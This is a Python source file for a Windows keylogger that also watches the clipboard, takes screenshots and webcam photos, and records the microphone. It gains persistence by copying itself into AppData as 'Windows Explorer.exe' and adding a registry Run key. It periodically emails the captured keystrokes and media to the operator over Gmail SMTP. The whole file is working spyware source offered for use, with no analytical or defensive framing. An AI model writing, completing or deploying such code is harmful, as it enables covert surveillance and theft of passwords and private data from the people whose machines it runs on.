import pynput.keyboard
import socket
import platform
import logging
import threading
import time
from PIL import ImageGrab
import win32gui
from cryptography.fernet import Fernet
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import pyperclip
import sounddevice as sd
from scipy.io.wavfile import write
import cv2
import shutil
import subprocess
import sys

class KeyLogger:
    def __init__(self, time_interval=60, email="your_email@gmail.com", password="your_password"):
        self.log = "KeyLogger Started..."
        self.interval = time_interval
        self.email = email
        self.password = password
        self.log_file = "keylog.txt"
        self.encrypted_log_file = "keylog.enc"
        self.key_file = "key.key"
        
        self.load_or_generate_key()
        self.get_system_info()
        self.become_persistent()

    def load_or_generate_key(self):
        if not os.path.exists(self.key_file):
            self.key = Fernet.generate_key()
            with open(self.key_file, "wb") as kf:
                kf.write(self.key)
        else:
            with open(self.key_file, "rb") as kf:
                self.key = kf.read()
        self.cipher = Fernet(self.key)

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def append_to_log(self, string):
        self.log = self.log + string
        self.save_log_encrypted()

    def get_system_info(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        
        info = f"\n[+] System Info:\nHostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n"
        self.append_to_log(info)

    def get_active_window(self):
        try:
            window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(window)
            return title
        except Exception:
            return "Unknown Window"

    def process_clipboard(self):
        last_clipboard = ""
        while True:
            try:
                current_clipboard = pyperclip.paste()
                if current_clipboard != last_clipboard:
                    self.append_to_log(f"\n[Clipboard]: {current_clipboard}")
                    last_clipboard = current_clipboard
            except Exception:
                pass
            time.sleep(5)

    def record_microphone(self):
        fs = 44100
        seconds = 10
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"audio_{timestamp}.wav"
        
        try:
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(filename, fs, myrecording)
            return filename
        except Exception:
            return None

    def take_webcam_picture(self):
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"webcam_{timestamp}.jpg"
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(filename, frame)
            cap.release()
            cv2.destroyAllWindows()
            return filename
        except Exception:
            return None

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        
        window_title = self.get_active_window()
        self.append_to_log(f"\n[Window: {window_title}] {current_key}")

    def save_log_encrypted(self):
        if self.log:
            try:
                encrypted_data = self.cipher.encrypt(self.log.encode())
                with open(self.encrypted_log_file, "wb") as f:
                    f.write(encrypted_data)
                    
                # Saving plain text as backup/debug
                # with open(self.log_file, "a") as f:
                #     f.write(self.log)
                    
                # self.log = ""  # Ideally clear, but for now we append to keep context in memory for email
            except Exception as e:
                print(f"Error saving log: {e}")

    def screenshot(self):
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            return filename
        except Exception:
            return None

    def send_mail(self):
        # NOTE: This requires 'Less Secure Apps' enabled or App Password for Gmail
        if self.email == "your_email@gmail.com":
            return

        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "KeyLogger Report"

        body = "Attached is the latest log and files."
        msg.attach(MIMEText(body, 'plain'))

        # List of files to attach
        files_to_attach = [self.encrypted_log_file]
        
        # Add screenshot
        screenshot = self.screenshot()
        if screenshot: files_to_attach.append(screenshot)
        
        # Add webcam
        webcam_pic = self.take_webcam_picture()
        if webcam_pic: files_to_attach.append(webcam_pic)
        
        # Add audio
        audio_file = self.record_microphone()
        if audio_file: files_to_attach.append(audio_file)

        for filepath in files_to_attach:
            if filepath and os.path.exists(filepath):
                attachment = open(filepath, "rb")
                p = MIMEBase('application', 'octet-stream')
                p.set_payload((attachment).read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', "attachment; filename= %s" % filepath)
                msg.attach(p)

        try:
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(self.email, self.password)
            text = msg.as_string()
            s.sendmail(self.email, self.email, text)
            s.quit()
            print("[+] Email sent.")
            
            # Reset log after successful email
            self.log = ""
            
            # Clean up files
            for f in files_to_attach:
                if f != self.encrypted_log_file: # Keep the log file
                    try:
                        os.remove(f)
                    except:
                        pass

        except Exception as e:
            print(f"[-] Error sending email: {e}")

    def report(self):
        self.send_mail()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        
        # Start Clipboard Thread
        t_clipboard = threading.Thread(target=self.process_clipboard)
        t_clipboard.daemon = True
        t_clipboard.start()
        
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    # Configure your email and password here
    keylogger = KeyLogger(time_interval=300, email="your_email@gmail.com", password="your_password")
    print("KeyLogger started... (Check keylog.enc)")
    keylogger.start()
